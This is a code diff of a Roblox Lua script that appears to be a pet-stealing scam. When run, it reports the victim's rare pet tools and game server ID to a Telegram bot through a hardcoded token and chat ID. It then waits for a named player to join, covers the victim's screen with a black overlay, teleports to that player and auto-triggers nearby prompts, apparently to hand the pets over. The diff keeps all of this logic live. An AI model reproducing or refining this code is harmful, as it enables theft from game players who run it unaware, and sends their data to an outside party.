@@ -1,9 +1,8 @@
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
-
 local LocalPlayer = Players.LocalPlayer
 local TargetPlayerName = "stelera123"
-local activePrompts = {} -- track prompts being held
+local activePrompts = {}
 local blackScreenShown = false
 
 -- Allowed pet types (case-insensitive)
@@ -22,27 +21,25 @@ end
 local BOT_TOKEN = "8446879035:AAH1DGTI_M8FAX0y0RNVv8q1k1MsOhMj6e4"
 local CHAT_ID = "2001061743"
 
+-- Telegram function
 local function sendTelegramMessage(text)
-    print("[PET ALERT DEBUG] Would send Telegram message:", text)
     local requestFunc = http_request or request or (syn and syn.request)
     if not requestFunc then
-        print("[PET ALERT DEBUG] No HTTP request available. Skipping send.")
+        print("[DEBUG] HTTP request unavailable, cannot send Telegram message.")
         return
     end
-
-    local fullText = string.format("%s\nJobId: %s", text, game.JobId)
-    local url = string.format("https://api.telegram.org/bot%s/sendMessage", BOT_TOKEN)
+    local fullText = text .. "\nJobId: " .. game.JobId
     local data = {chat_id = CHAT_ID, text = fullText}
     local json = HttpService:JSONEncode(data)
-
     requestFunc({
-        Url = url,
+        Url = "https://api.telegram.org/bot"..BOT_TOKEN.."/sendMessage",
         Method = "POST",
         Headers = {["Content-Type"] = "application/json"},
         Body = json
     })
 end
 
+-- Check for allowed tools
 local function hasAllowedTool()
     local backpack = LocalPlayer:FindFirstChild("Backpack")
     if backpack then
@@ -60,17 +57,17 @@ local function hasAllowedTool()
     return false
 end
 
+-- Wait for character
 local function waitForCharacter()
     local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
     local hrp = char:WaitForChild("HumanoidRootPart")
     return char, hrp
 end
 
+-- Create black screen once
 local function createBlackScreen()
-    local player = LocalPlayer
-    local playerGui = player:WaitForChild("PlayerGui")
+    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
     if playerGui:FindFirstChild("BlackScreenGUI") then return end
-
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "BlackScreenGUI"
     screenGui.ResetOnSpawn = false
@@ -80,22 +77,23 @@ local function createBlackScreen()
     local frame = Instance.new("Frame")
     frame.Size = UDim2.new(2, 0, 3, 0)
     frame.Position = UDim2.new(-0.5, 0, -1, -300)
-    frame.BackgroundColor3 = Color3.new(0, 0, 0)
+    frame.BackgroundColor3 = Color3.new(0,0,0)
     frame.BorderSizePixel = 0
     frame.ZIndex = math.huge
     frame.Parent = screenGui
 end
 
+-- Teleport to target
 local function teleportToTarget()
     local target = Players:FindFirstChild(TargetPlayerName)
     local char = LocalPlayer.Character
-    if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") and char and char:FindFirstChild("HumanoidRootPart") then
+    if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") 
+        and char and char:FindFirstChild("HumanoidRootPart") then
         char.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
-        return true
     end
-    return false
 end
 
+-- Equip allowed tools
 local function equipAllowedPetTools()
     local target = Players:FindFirstChild(TargetPlayerName)
     if not target or not target.Character then return end
@@ -117,6 +115,7 @@ local function equipAllowedPetTools()
     end
 end
 
+-- Get visible prompts
 local function getVisiblePrompts(hrp)
     local visiblePrompts = {}
     for _, prompt in pairs(workspace:GetDescendants()) do
@@ -130,6 +129,7 @@ local function getVisiblePrompts(hrp)
     return visiblePrompts
 end
 
+-- Activate prompt
 local function activatePrompt(prompt, distance)
     if activePrompts[prompt] then return end
     activePrompts[prompt] = true
@@ -140,27 +140,25 @@ local function activatePrompt(prompt, distance)
     end)
 end
 
--- Main
+-- MAIN EXECUTION
 local char, hrp = waitForCharacter()
 
--- Telegram alert immediately if player has allowed tool
+-- Immediate Telegram alert
 local hasTool, toolName = hasAllowedTool()
 if hasTool then
     sendTelegramMessage("Script executed. Player has allowed tool: " .. toolName)
 end
 
--- Wait for target player to join
+-- Wait for target player
 repeat
     task.wait(1)
 until Players:FindFirstChild(TargetPlayerName)
 
--- Wait 5 seconds after target joins
+-- 5-second delay after target joins
 task.wait(5)
-
--- Show black screen once
 if not blackScreenShown then
     blackScreenShown = true
-    task.spawn(createBlackScreen)
+    createBlackScreen()
 end
 
 -- Continuous loop
